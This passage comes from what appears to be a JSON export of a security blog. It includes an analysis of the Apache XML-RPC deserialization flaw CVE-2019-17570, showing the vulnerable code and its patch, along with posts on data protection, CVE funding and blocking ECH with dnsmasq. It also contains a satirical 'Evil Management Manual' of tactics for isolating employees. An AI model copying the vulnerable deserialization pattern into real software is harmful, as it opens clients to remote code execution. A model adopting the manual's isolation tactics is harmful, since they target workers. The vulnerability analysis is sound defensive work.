between services. And on the server side:\nSoftware-based key protection alone is insufficient. HSM or equivalent Secure Environment must be used to: Prevent key leakage Protect boot integrity Detect and resist physical tampering In short:\nEarly mobile networks sacrificed security for rapid rollout,\nwhereas today, trust is the absolute prerequisite for telecom infrastructure.\n6. Practical Countermeasures for Individual Users Use OpenVPN through a Home Router and Restrict Access to Main Services by IP Address\nOpenVPN Installation Guide Adopt OTP Apps\nGoogle Authenticator Introduction Use Hardware Security Keys\nYubiKey Official Site Demand 5G SA Infrastructure Upgrades from Carriers and Government\nQualcomm - 5G SA vs NSA 7. Conclusion There is no such thing as a perfect network.\nBut daily, proactive efforts to protect ourselves\nremain the only true shield against silent, invisible threats.\nAdditional Comparative Analysis SKT Breach: Affected ~23 million users; Ki leakage suspected; no abuse reported yet. Gemalto Breach: Global SIM supply chain attack; mass key leakage debated. APT10 Operation Soft Cell: Long-term infiltration of telecom cores by a Chinese APT group. Circles Eavesdropping: SS7 vulnerabilities exploited for covert surveillance on a global scale. References SKT Official Newsroom The Intercept - The Great SIM Heist WIRED - Gemalto Hacked Cybereason - Operation Soft Cell Citizen Lab - Running in Circles ","permalink":"https://windshock.github.io/en/post/2025-04-28-telecom-security-breach-analysis/","summary":"An in-depth analysis focusing on the 2025 SKT breach, the core security structures of telecom infrastructure, and historical global incidents (Gemalto, APT10, Circles). Also covers subscriber authentication (Ki, SUPI/SUCI) and security differences between 5G SA and NSA.","title":"In-Depth Report on Telecommunication Security: SKT Breach and Global Case Studies"},{"content":"\n1. Overview 1.1 Purpose of the Report This report analyzes the cause and resolution of the CVE-2019-17570 vulnerability in Apache XML-RPC and provides a practical guide for secure implementation in real-world projects.\n1.2 Background Many existing security guides and tools simply report ‚Äúno patch available‚Äù when there is no official fix, without providing developers with concrete remediation steps. This report aims to close that gap by offering actionable security advice from the security team to development teams.\n1.3 Introduction to Apache XML-RPC Apache XML-RPC is a Java-based library that implements XML-RPC, no longer officially maintained by Apache.\n1.4 Summary of CVE-2019-17570 The vulnerability allows Remote Code Execution (RCE) by deserializing untrusted server responses on the client side.\nOfficial advisory: GitHub Advisory 2. Detailed Vulnerability Analysis 2.1 Overview and Impact CWE-502: Deserialization of Untrusted Data An attacker can exploit a malicious XML-RPC server to execute arbitrary code on the client. 2.2 Root Cause Object exception = map.get(\u0026#34;faultCause\u0026#34;); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream((byte[]) exception)); errorCause = (Throwable) ois.readObject(); // Vulnerable code 2.3 Attack Scenario (PoC) A crafted faultCause object sent by a malicious server is deserialized by the client, resulting in code execution.\n3. Patch Analysis 3.1 Key Enhancements Introduced isEnabledForExceptions flag to conditionally allow deserialization Disabled external DTD loading in SAXParser for added XML security 3.2 Code Comparison Before and After Patch After Patch:\nif (((XmlRpcStreamRequestConfig) cfg).isEnabledForExceptions()) { Object exception = map.get(\u0026#34;faultCause\u0026#34;); ... } Disable DTD Loading:\nspf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); 3.3 Manual Patch Examples Debian Patch openEuler Patch 4. Distribution-Specific Patch Status and Maven Considerations 4.1 Patched Distributions Debian, Red Hat, Amazon Linux: security patches are applied and managed independently 4.2 Limitations of Maven Central No patched version available beyond official 3.1.3; users should use distribution packages or forked versions 4.3 Recommended Dependency \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.evolvedbinary.thirdparty.org.apache.xmlrpc\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;xmlrpc-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 5. Secure Implementation Example XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl(); config.setServerURL(new URL(\u0026#34;http://trusted-server.com/RPC2\u0026#34;)); config.setEnabledForExceptions(false); // Disable deserialization // Disable external DTD loading SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); SAXParsers.setSAXParserFactory(spf); 6. Conclusion and Recommendations Use distribution-specific patched versions Consider using the evolvedbinary fork Migrate to gRPC, JAX-WS, or SOAP for long-term robustness This report provides actionable insights and implementation tips to mitigate CVE-2019-17570 in production environments.\n","permalink":"https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/","summary":"A detailed analysis of the CVE-2019-17570 deserialization vulnerability in the Apache XML-RPC library, including patching methods and secure implementation practices.","title":"CVE-2019-17570 Apache XML-RPC Vulnerability Analysis Report"},{"content":" Is Your Data in the Cat\u0026rsquo;s Paws? The 2025 KakaoPay Case and the Structural Limitations of Korea‚Äôs Data Protection System Introduction In January 2025, Korea\u0026rsquo;s Personal Information Protection Commission (PIPC) imposed a fine of KRW 6 billion (approximately USD 5.8 million) on KakaoPay (MLex, 2025). Roughly 40 million users\u0026rsquo; data had been transferred to China‚Äôs Alipay without explicit consent and used to build a Non-Financial Score (NSF) model. NSF is a credit-like index that can significantly influence one‚Äôs life‚Äîinsurance rates, loan approvals, or job prospects.\nThis incident is not merely about a data leak‚Äîit reveals the structural flaws of formal consent and corporate self-regulation. We would never entrust a cat to guard a fish market, so why do we hand over our personal data to corporations so easily? This report analyzes the KakaoPay case from legal, technical, and societal perspectives and proposes AI-based DPIA verification tools and citizen monitoring to realize data democracy.\n1. The KakaoPay Case: Details and Legal Violations Case Summary Timeline: April to July 2018 ‚Äî data transfers occurred in three phases (Businesskorea, 2025). Data Transferred: 5.42 billion records, including 24 types of sensitive information such as user names, phone numbers, emails, and account balances. Purpose: Alipay used the data to train its NSF score model. NSF is a non-financial credit index affecting insurance rates, loan decisions, and employment opportunities. Sanctions: In January 2025, the PIPC fined KakaoPay KRW 6 billion and Apple KRW 2.45 billion. Alipay was ordered to dismantle the NSF model. Legal Breaches KakaoPay violated the following clauses of the Personal Information Protection Act (PIPA):\nArticle 20 (Third-Party Consent Requirement): Explicit and specific user consent is required before data is shared with third parties. The consent form failed to mention NSF usage. Article 28 (Cross-Border Data Transfers): Cross-border data transfers require separate consent and additional protection measures. KakaoPay did not comply. ‚ÄúUsers gave consent, but had no idea what they were consenting to.‚Äù\n‚Äî Korea Bizwire, 2025\n2. Structural Flaws in Korea‚Äôs Personal Information Protection Act (PIPA) Summary of Key Provisions Article 20: Requires explicit consent for third-party provision. Article 28: Mandates separate consent and protection for international data transfers. Article 33: Requires a Data Protection Impact Assessment (DPIA) for high-risk data processing. Recent Amendments 2023: A major revision introduced the principle of ‚Äúsame activity, same regulation,‚Äù eliminating special exemptions for Online Service Providers (OSPs). Effective from September 15, 2023 (Data Protection Laws of the World). 2024 Presidential Decree: Introduced the right to explanation for automated decisions, strengthened qualifications for Chief Privacy Officers (CPO), and made data breach insurance mandatory. Problems with Self-Regulation Non-Public DPIA: DPIAs are internally authored and not required to be disclosed, creating a lack of transparency and room for evasion of responsibility. Lack of Oversight: PIPC‚Äôs enforcement focuses on post-violation penalties, not proactive prevention. Korea‚Äôs PIPA structure where companies self-author DPIAs has been likened to letting a cat guard the fish. DLA Piper criticized the non-disclosure of DPIA reports as a lack of transparency.\n‚Äî DLA Piper ‚Äì South Korea Data Protection\n3. AI-Based DPIA Verification: A Technological Opportunity AI can enhance the objectivity and transparency of DPIAs. AI-based DPIA verification tools can analyze data flows, detect potential risks, and auto-generate reports. In Europe, the \u0026ldquo;Privacy-Aware AI\u0026rdquo; framework is used to assess GDPR compliance. Similar approaches can be adopted in Korea (Fieldfisher, 2023).\nExamples of AI-Based DPIA Tools Several platforms have begun to integrate AI in supporting DPIA processes:\nKetch offers AI-powered recommendations for automated Privacy Impact Assessments (PIAs), helping improve DPIA accuracy and risk identification. Securiti provides global DPIA automation capabilities. Although it does not overtly advertise AI functionality, its framework implies AI-driven assessments. Clarip markets its DPIA automation software with phrases like ‚ÄúHybrid AI Rocks!‚Äù suggesting AI assistance, though specific AI features are not fully detailed. These platforms primarily aim to automate privacy risk assessments, supporting the DPIA process by detecting overlooked vulnerabilities and ensuring comprehensive reviews. However, most are not designed as standalone DPIA verification engines, and the transparency of AI components varies.\nAcademic and Industry Research While research directly targeting AI-based DPIA verification is still scarce, there are valuable resources on conducting DPIAs for AI systems and integrating AI into DPIA processes:\nFieldfisher‚Äôs guide outlines best practices for DPIAs in AI contexts and explains how AI technologies can support privacy compliance. Mansi‚Äôs blog explores AI-assisted methods in DPIA, such as automated classification, predictive risk analysis, monitoring, and documentation. The academic paper \u0026ldquo;Proposing a Data Privacy Impact Assessment (DPIA) Model for AI Projects under U.S. Privacy Regulations\u0026rdquo; (ResearchGate, 2025) proposes a DPIA framework tailored to AI projects, highlighting the need for structured, AI-integrated assessment models. These sources build the foundation for evolving AI-enhanced DPIA tools and models that combine legal compliance with technical precision.\nChallenges and Outlook Currently, AI-based DPIA verification tools remain limited. They often function as compliance support tools rather than dedicated verification engines. However, they offer significant potential to improve DPIA processes in terms of efficiency, comprehensiveness, and objectivity. As research advances and regulatory demand increases, more sophisticated and transparent AI-driven DPIA tools are expected to emerge in the near future.\n4. The Role and Effectiveness of Civic Monitoring Citizen oversight is critical for effective privacy protection. The 2022 Future of Privacy Forum (FPF) report criticized the limits of consent-based frameworks and emphasized risk-based approaches and civic engagement (FPF, 2022). Studies in the ACM Digital Library support citizen-centered governance, especially in smart city contexts (DGOV, 2023).\nIn fact, the KakaoPay case was initiated by a citizen group‚Äôs report, which led to a police investigation‚Äîhighlighting the power of civic monitoring (MLex, 2024).\n5. Institutional Proposals for Data Democracy The KakaoPay case exposed systemic vulnerabilities in data protection. Institutional reform combining AI verification and civic oversight is essential:\nIntroduce AI-Based DPIA Verification\nLed by the PIPC, use AI tools to verify the objectivity of DPIA reports. Mandate DPIA Transparency\nRequire public summaries of DPIAs and establish independent review committees including experts and citizens. Establish a Right to Data Location APIs\nExpand PIPA Article 18 (Data Portability Rights) to mandate APIs that track data storage and movement paths. Strengthen Explanations for Automated Decisions\nMandate clear explanations for decisions like NSF scores and impose penalties for non-compliance. Institutionalize Public Citizen Auditing Teams\nLegalize citizen-led audits involving civil society, academia, and professionals to inspect data processing practices. Democratize the PIPA Revision Process\nMandate public hearings and formal inclusion of consumer advocacy groups in legislative procedures. Conclusion The 2025 KakaoPay case laid bare the limits of formal consent and self-regulation. Though PIPA is a strong framework, without oversight and civic engagement, it remains hollow. AI-powered DPIA verification tools offer a technological solution for transparency and objectivity, while civic monitoring is the social engine that sustains it. It is time to open the gates of corporate data control and realize data democracy through collaboration between citizens and experts.\nReferences MLex, 2025 Businesskorea, 2025 Data Protection Laws of the World Fieldfisher, 2023 FPF, 2022 DGOV, 2023 MLex, 2024 ","permalink":"https://windshock.github.io/en/post/2025-04-21-expert-personal-data-report/","summary":"The 2025 KakaoPay case exposed the limits of formal consent and self-regulation. Data democracy must be achieved through AI-based DPIA verification and civic oversight.","title":"Is Your Data in the Cat's Paws?"},{"content":"\n‚ÄúThere‚Äôs no such thing as a free lunch.‚Äù\nBut for decades, cybersecurity has felt like one.\nCVE: Not Just a Number, But a Map CVE‚ÄîCommon Vulnerabilities and Exposures‚Äîis often mistaken for just another ID system.\nBut as Adam Shostack explains, its true value lies not in the number itself, but in its function as a stable knowledge concordance across disparate systems:\n‚ÄúThe value of CVE is not the number, but its ability to reliably cross-reference tools, databases, and vendor patches.‚Äù\nIn essence, CVE is like the ISBN for cybersecurity. It allows tools, vendors, researchers, and patching systems to align with one shared reference.\nA System We All Used, For Free CVE has been maintained by MITRE, a U.S. government-funded nonprofit.\nAnd yet, the entire global security ecosystem has depended on this system for free:\nEnterprises Governments Open source communities Security vendors CVE has operated as a global public good, without international funding, and with most contributions from unpaid researchers.\nThe Collapse That Nearly Happened In April 2025, MITRE\u0026rsquo;s government contract for CVE operations nearly expired.\nA last-minute intervention from CISA granted an 11-month extension, but the future remains uncertain.\nWe narrowly avoided the collapse of the system that powers vulnerability coordination worldwide.\nThe structural issue is clear: CVE relies on a single nation\u0026rsquo;s funding, despite global usage. This concern has been highlighted in recent reports from Reuters, BleepingComputer, and The Register.\nWhat If There Were a Security Tax? Imagine this:\nHigh-risk corporations contribute a small percentage of revenue to a public fund for security infrastructure.\nThis fund supports CVE-like systems, NGOs, bug bounty programs, and researcher compensation.\nThis idea is explored further in this article.\nWhile this model is not yet implemented anywhere, it reflects a growing recognition:\nFree-riding on security infrastructure is unsustainable Public security systems require collective funding Contributors deserve compensation, not just credit Further discourse in BankInfoSecurity and TechTarget shows a shift toward incentives and reframing cybersecurity as a shared cost burden.\nIt\u0026rsquo;s Time to Pay for What We\u0026rsquo;ve Been Using CVE wasn‚Äôt truly free.\nIt ran on the unpaid labor of researchers, the infrastructure of nonprofits, and a single government‚Äôs budget.\nNow, as that model falters, we need shared solutions:\nInternational funding models Industry co-funding Governmental cooperation Transparent compensation for contributors Initiatives like Common Good Cyber are beginning to pave the way. Their proposed structures‚Äîjoint funding mechanisms, federated fundraising, and accelerator hubs‚Äîwere highlighted at RSA Conference 2025, aiming to produce a global, multilateral support system.\nThis also aligns with public-private models advocated by CSIS.\nSecurity has felt like a free lunch.\nBut someone was always paying.\nüìå TL;DR CVE is core public infrastructure for cybersecurity. It\u0026rsquo;s been used globally but funded locally. It nearly collapsed in 2025 due to expiring contracts. We must build funding mechanisms for global security commons. The free lunch is over. We just didn‚Äôt notice who was footing the bill.\n","permalink":"https://windshock.github.io/en/post/2025-04-17-theres-no-such-thing-as-a-free-lunch-but-security-was-free/","summary":"The global security community has depended on CVE for decades without ever paying a dime. As the system nears collapse, it\u0026rsquo;s time to ask who should bear the cost of public cybersecurity infrastructure.","title":"There‚Äôs No Such Thing as a Free Lunch, But Security Was Free"},{"content":"üìÇ [Confidential Document] Leaked Copy\nIn the AI Era, Employees Are Isolated and Organizations Thrive ‚Äî Evil Management Manual v1.0 1. Human Relationships? Eliminate Them What happens when people get too close?\nGossip Mass resignations Solidarity and resistance ‚úÖ Solution: Build an AI-centered communication system\nAutomate meeting summaries, reminders, and reports Reduce human interaction ‚Üí Eliminate emotional overhead ‚ÄúTeamwork is a cost. Efficiency comes from silent individuals.‚Äù\n2. Isolation Means Control Lonely employees work quietly.\nNo peers to share concerns with No place to vent stress Obey rules before raising issues ‚úÖ Implementation Strategy:\nPromote remote work and asynchronous communication Use collaboration tools focused on AI summarization Minimize meetings, quantify feedback ‚ÄúIsolation equals obedience.‚Äù\n3. Leadership Is Replaced by Data Managers no longer comfort or persuade.\nAI handles assignment, tracking, reminders Performance evaluated solely through KPIs ‚úÖ Leader‚Äôs New Role:\nInterpret dashboards instead of emotions Provide metric-based feedback instead of trust ‚ÄúHumans are emotional. Data is not.‚Äù\n4. Autonomy = Personal Responsibility Flexible work? AI tools provided? Sounds great, right?\nActually, all responsibility shifts to individuals When they fail: ‚ÄúYou chose this yourself.‚Äù ‚úÖ Usage Strategy:\nEmphasize workflow automation tools Frame mistakes as personal decisions, not managerial failure ‚ÄúWe helped. You failed. That‚Äôs it.‚Äù\n5. Isolation Delays Resignation Disconnected employees hesitate to leave.\nNo one to vent to ‚Üí Less conviction No peers to leave with ‚Üí Delay ‚úÖ Retention Strategy:\nMinimize non-work communication channels Discourage informal gatherings Let AI quietly collect HR exit signals ‚ÄúThe isolated break quietly. And remain.‚Äù\nüìà Conclusion: This Isn‚Äôt Efficiency. It‚Äôs the Art of Control. Organizational Problem AI-Era Solution Emotional labor stress Eliminated (AI summaries) Team bonding / social cost Eliminated (structured remote work) Complaints, collective acts Eliminated (communication silos) Blame ambiguity Solved via ‚Äúautonomous‚Äù framing Leadership burden Replaced by dashboards ‚ÄúGrowth comes to those who work quietly.\nIsolation fattens the company.‚Äù\n‚ò† This document is confidential. Access is logged. ‚ò†\n","permalink":"https://windshock.github.io/en/post/2025-04-07-evil-management-manual/","summary":"\u003cp\u003eüìÇ \u003cstrong\u003e[Confidential Document] Leaked Copy\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"in-the-ai-era-employees-are-isolated-and-organizations-thrive\"\u003eIn the AI Era, Employees Are Isolated and Organizations Thrive\u003c/h1\u003e\n\u003ch3 id=\"-evil-management-manual-v10\"\u003e‚Äî Evil Management Manual v1.0\u003c/h3\u003e\n\u003ch2 id=\"in-the-ai-era-the-isolated-human\"\u003e\u003cimg alt=\"In the AI Era, the Isolated Human\" loading=\"lazy\" src=\"/images/post/Employees-Are-Isolated-and-Organizations-Thrive.webp\"\u003e\u003c/h2\u003e\n\u003ch2 id=\"1-human-relationships-eliminate-them\"\u003e1. Human Relationships? Eliminate Them\u003c/h2\u003e\n\u003cp\u003eWhat happens when people get too close?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eGossip\u003c/li\u003e\n\u003cli\u003eMass resignations\u003c/li\u003e\n\u003cli\u003eSolidarity and resistance\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e‚úÖ \u003cstrong\u003eSolution\u003c/strong\u003e: Build an AI-centered communication system\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAutomate meeting summaries, reminders, and reports\u003c/li\u003e\n\u003cli\u003eReduce human interaction ‚Üí Eliminate emotional overhead\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e‚ÄúTeamwork is a cost. Efficiency comes from silent individuals.‚Äù\u003c/p\u003e","title":"In the AI Era, Employees Are Isolated and Organizations Thrive"},{"content":"\nWe live in an era overflowing with information and surging technology.\nAI mimics human speech, summarizes thought, and even predicts intent.\nBut amidst all this, something vital is slowly being forgotten.\nThat is:\n\u0026ldquo;Who thought of it first,\u0026rdquo;\n\u0026ldquo;Who connected it,\u0026rdquo;\n\u0026ldquo;Who gave it meaning.\u0026rdquo;\nAI processes data. But insight belongs to humans.\nTo reinterpret the bypassing of Citrix VDI policies not as a mere technical vulnerability,\nbut as a legal violation,\na collapse of network isolation,\nand a real-world regulatory failure‚Äî\nthat is not something AI can do.\nIt is a human act of context-building and\na creative synthesis of law, policy, and technical risk.\nI asked AI for assistance‚Äî and it documented, expanded, and supported my idea.\nBut that was not creation, it was collaboration.\nAnd true collaboration requires boundaries and ethics.\nThe danger today is that AI cannot tell you and me apart.\nIt cannot distinguish between the human and the machine.\nIt cannot trace the originator from the final user.\nOne day, even human-born ideas\nmay be mistakenly credited to AI.\nThat is not just a technological leap‚Äî\nit is a silencing of memory.\nSo I make this declaration. I will record my ideas.\nI will name their origin.\nI will embed my presence in forms machines can understand.\nIn the \u0026lt;meta\u0026gt; of HTML,\nIn the author field of Markdown,\nIn the refusal written into robots.txt‚Äî\nI write my name.\nI say this: ‚ÄúThis thought belongs to a human.‚Äù\n‚ÄúThis insight was first spoken by windshock.‚Äù\n‚ÄúAI is an assistant, not an author.‚Äù\nThis is not a grand claim of copyright.\nIt is a mark that I was here.\nThat I created.\nLet technology progress‚Äî\nbut let human presence remain.\nMachines may speak,\nbut meaning is made by us.\nAnd I trust that meaning will be remembered\nby people like you, who are reading these words now.\nüñãÔ∏è windshock, April 2025\nA boundary-drawer in the age of machine collaboration.\nüìö Further Reading \u0026amp; References U.S. Copyright Office ‚Äì Official stance confirming that works generated solely by AI are not eligible for copyright protection.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nThe Ethics of AI Art ‚Äì Discussion of how AI-generated art impacts human artists, including issues of style imitation and copyright infringement.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI as a Tool or Creator? ‚Äì Debates on whether AI merely assists humans or takes on an authorial role in creative processes.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nCopyright Lawsuits over AI Training Data ‚Äì Class actions filed against AI developers for training on copyrighted content without permission.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nLegal Standards for Copyright in AI-Assisted Works ‚Äì Overview of how human contribution is assessed in works involving generative AI.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\nMetadata and Attribution Strategies ‚Äì Proposals for preserving human authorship through metadata, prompt documentation, and transparency.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"https://windshock.github.io/en/post/2025-04-03-human-place-in-ai-age/","summary":"\u003cp\u003e\u003cimg alt=\"Abstract illustration representing human presence in AI\" loading=\"lazy\" src=\"/images/human-place-abstract.webp\"\u003e\u003c/p\u003e\n\u003cp\u003eWe live in an era overflowing with information and surging technology.\u003cbr\u003e\nAI mimics human speech, summarizes thought, and even predicts intent.\u003cbr\u003e\nBut amidst all this, something vital is slowly being forgotten.\u003c/p\u003e\n\u003cp\u003eThat is:\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who thought of it first,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who connected it,\u0026rdquo;\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003e\u0026ldquo;Who gave it meaning.\u0026rdquo;\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai-processes-data\"\u003eAI processes data.\u003c/h3\u003e\n\u003cp\u003eBut \u003cstrong\u003einsight belongs to humans\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eTo reinterpret the bypassing of Citrix VDI policies \u003cstrong\u003enot\u003c/strong\u003e as a mere technical vulnerability,\u003cbr\u003e\nbut as a \u003cstrong\u003elegal violation\u003c/strong\u003e,\u003cbr\u003e\na \u003cstrong\u003ecollapse of network isolation\u003c/strong\u003e,\u003cbr\u003e\nand a \u003cstrong\u003ereal-world regulatory failure\u003c/strong\u003e‚Äî\u003cbr\u003e\nthat is not something AI can do.\u003cbr\u003e\nIt is a human act of context-building and\u003cbr\u003e\n\u003cstrong\u003ea creative synthesis of law, policy, and technical risk.\u003c/strong\u003e\u003c/p\u003e","title":"The Place of Humans: Declaring the Creator‚Äôs Rights in the Age of AI"},{"content":"\nAs modern software development grows more complex and security threats more frequent, developers often fall into common misconceptions about security responsibilities and protections. This article categorizes the most common developer security myths into three groups‚ÄîResponsibility Deflection, Overconfidence in Technology, and Security Underestimation‚Äîand provides realistic, actionable counterpoints.\nüìå 1. Responsibility Deflection Myth: \u0026ldquo;Security is the security team‚Äôs responsibility, not mine.\u0026rdquo; Reality: Developers play a critical role in ensuring secure applications. In DevSecOps environments, security is a shared responsibility. When developers overlook security from the early stages, vulnerabilities can easily creep into code (source).\nMyth: \u0026ldquo;We use GitHub, AWS, and other SaaS platforms‚Äîso we‚Äôre safe.\u0026rdquo; Reality: While SaaS providers offer security measures, users are still responsible for correct configurations and avoiding insecure integrations. A recent GitHub Actions supply chain attack via tj-actions/changed-files exposed the risks (source).\nüìå 2. Overconfidence in Technology Myth: \u0026ldquo;Our code is written in Rust, so it‚Äôs secure.\u0026rdquo; Reality: Rust ensures memory safety and prevents data races, but doesn‚Äôt automatically guard against threats like SQL injection or XSS. Using unsafe blocks can reintroduce vulnerabilities. Carnegie Mellon\u0026rsquo;s SEI outlines Rust‚Äôs limits, especially regarding third-party library misuse and injection attacks (source).\nMyth: \u0026ldquo;We use the latest frameworks and libraries‚Äîit must be secure.\u0026rdquo; Reality: Modern tools are not immune to security flaws. Without regular updates and proper usage, vulnerabilities remain. A study found 86% of open-source codebases include known vulnerabilities (source).\nMyth: \u0026ldquo;HTTPS keeps our data safe.\u0026rdquo; Reality: HTTPS secures data in transit but does not protect against server-side vulnerabilities, misconfigurations, or insider threats.\nMyth: \u0026ldquo;A firewall protects us from external threats.\u0026rdquo; Reality: Firewalls can be misconfigured and don‚Äôt protect against insider threats or attacks using trusted connections.\nüìå 3. Security Underestimation Myth: \u0026ldquo;We don‚Äôt handle sensitive data, so security isn‚Äôt a concern.\u0026rdquo; Reality: Even seemingly harmless systems can become entry points for attackers to access larger networks.\nMyth: \u0026ldquo;Code reviews will catch all the security issues.\u0026rdquo; Reality: Code reviews are useful, but without security expertise and automated tools, many vulnerabilities go undetected. Regular testing and security scans are essential.\nMyth: \u0026ldquo;We‚Äôve tested the code‚Äîso it must be safe.\u0026rdquo; Reality: Functional tests don‚Äôt cover security flaws. Security testing must be a separate, ongoing process involving both design and runtime analysis.\nüìå Real-World Incidents GitHub Actions Supply Chain Attack (2025)\n‚Üí Over 23,000 repositories at risk of CI/CD secret exposure (source).\nLog4Shell Vulnerability (2021)\n‚Üí Critical remote code execution vulnerability in Apache Log4j affected systems globally (source).\nüìå Recommendations for Developers Provide Regular Security Training\nFocus on practical awareness, using OWASP Top 10 as a foundational guide (source).\nIntegrate Security Automation\nUse tools like SAST (Static Analysis), DAST (Dynamic Analysis), and SBOM (Software Bill of Materials) to continuously monitor code.\nManage Open Source Dependencies\nEmploy automated tools like Dependabot or Renovate to detect and patch vulnerable libraries.\nPin Dependency Versions\nUse commit hashes instead of floating tags (e.g., @v3) in GitHub Actions to avoid supply chain attacks.\nSecurity isn\u0026rsquo;t just about tools‚Äîit\u0026rsquo;s a shared culture and ongoing process that must be built into how we write, test, and deliver code.\n","permalink":"https://windshock.github.io/en/post/2025-04-01-common-security-myths-developers-tell-themselves/","summary":"This article breaks down common developer security myths‚Äîresponsibility deflection, overconfidence in technology, and security underestimation‚Äîand offers realistic countermeasures.","title":"Common Security Myths Developers Tell Themselves"},{"content":"\nBackground Public DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\nNote: ESNI (Encrypted SNI) is deprecated and has been replaced by ECH as the current standard. This guide focuses on ECH only.\nThreat Factors Policy Bypass: Users can manually configure public DoH servers like Cloudflare or Google, bypassing enterprise DNS policies. C2 Evasion: ECH encrypts the SNI field during TLS handshakes, making domain-based filtering difficult. Data Exfiltration: Encrypted DNS channels may be exploited to send internal data outside the organization. Core Point: ECH and DoH Are Separate ‚Äì Different Mitigations Required The method described in this post using dnsmasq targets only ECH. DoH is not blocked by this method. Since DoH sends DNS queries over HTTPS, separate network-layer actions such as firewall rules or IP blocking are required. Examples: Block Cloudflare DoH (1.1.1.1:443), Google DoH (8.8.8.8:443), etc. Reference: Cisco Umbrella Guide to Prevent DoH Circumvention Solution: DNS Server-Level Control over ECH Client-side settings can be easily reverted by users, so it is recommended to control ECH centrally at the DNS server.\nBy filtering SVCB (65) and HTTPS (64) records using dnsmasq, clients can be prevented from advertising or negotiating ECH.\nHands-on: Blocking ECH with dnsmasq on macOS For other operating systems (Windows, Linux, etc.), setup steps differ. dnsmasq works across platforms but has different installation procedures.\n1. Install dnsmasq brew install dnsmasq 2. Edit the Configuration File sudo nano /opt/homebrew/etc/dnsmasq.conf Add the following lines:\n# Upstream DNS server server=8.8.8.8 # Filter SVCB (65) and HTTPS (64) records filter-rr=SVCB,HTTPS 3. Start dnsmasq sudo dnsmasq --conf-file=/opt/homebrew/etc/dnsmasq.conf 4. Set System DNS to localhost networksetup -setdnsservers Wi-Fi 127.0.0.1 For Ethernet connections, replace Wi-Fi with Ethernet.\nConfirming ECH is Disabled Visit https://crypto.cloudflare.com/cdn-cgi/trace to check ECH status.\nExample Output: Look for sni=encrypted or sni=plaintext Conclusion Filtering SVCB and HTTPS records using dnsmasq can help block ECH negotiation. DoH is not blocked by this approach and requires firewall-based solutions. For non-macOS users, refer to OS-specific guides or implement firewall/DNS-layer defenses. While blocking ECH improves enterprise visibility, it may reduce user privacy‚Äîthis trade-off should be acknowledged. Note: Finally, for readers who are more deeply interested in technologies related to internet censorship, the net4people/bbs GitHub issues page is a valuable resource where the global community discusses censorship circumvention strategies and the latest research. This forum covers a wide range of topics including the Great Firewall (GFW), Encrypted Client Hello (ECH), DNS encryption, and more, sharing technical insights and solutions.\nReferences Cloudflare on ECH dnsmasq official documentation National Security Agency - Adopting Encrypted DNS in Enterprise Environments Cisco Umbrella Guide on Preventing DoH Circumvention Broadcom\u0026rsquo;s OS-specific DoH blocking strategies ","permalink":"https://windshock.github.io/en/post/2025-03-31-dnsmasq-ech-doh-block/","summary":"\u003cp\u003e\u003cimg alt=\"DNSMASQ-block background\" loading=\"lazy\" src=\"/images/post/dnsmasq-ech-doh-block.webp\"\u003e\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003ePublic DNS services like Cloudflare (1.1.1.1) and Google (8.8.8.8) have increasingly been abused as C2 channels for malware.\u003cbr\u003e\nTechnologies such as DoH (DNS over HTTPS) and ECH (Encrypted Client Hello) encrypt DNS traffic and SNI fields, making it difficult for security solutions to detect and inspect network activity.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e: ESNI (Encrypted SNI) is deprecated and has been replaced by \u003cstrong\u003eECH\u003c/strong\u003e as the current standard. This guide focuses on ECH only.\u003c/p\u003e","title":"How to Block ECH and Mitigate DoH in Enterprise Networks"},{"content":"XML-RPC Security Series:\nSeries 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies Series 2 - CVE-2019-17570: Apache XML-RPC Exploit Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned Summary Overview of XML-RPC Vulnerabilities: As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation. Notable Cases: NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc. Real-World Use Cases: In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems. Mitigation Strategies: Disabling 